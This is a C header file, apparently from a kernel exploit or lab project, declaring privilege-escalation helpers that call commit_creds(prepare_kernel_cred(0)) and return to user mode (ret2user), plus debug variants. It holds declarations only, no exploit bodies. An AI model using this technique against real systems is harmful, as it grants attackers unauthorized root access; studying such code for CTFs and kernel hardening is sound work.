#ifndef PRIVESC_H
#define PRIVESC_H

#include <stdint.h>  // for uintptr_t
#include <stddef.h>  // for size_t

/* Kernel Privesc via kcred */

// commit_creds(prepare_kernel_cred(0)); jmp to ret2user
void privesc_kcred(uintptr_t commit_creds,
                   uintptr_t prepare_kernel_cred,
                   void (*jmp_ret)(void));

// For debugging user
void privesc_kcred_test(uintptr_t commit_creds,
                   uintptr_t prepare_kernel_cred);
void ret_asm_test(void);

/* Wrapper that sets up globals for privesc functions */
void privesc(void);

#endif  // PRIVESC_H
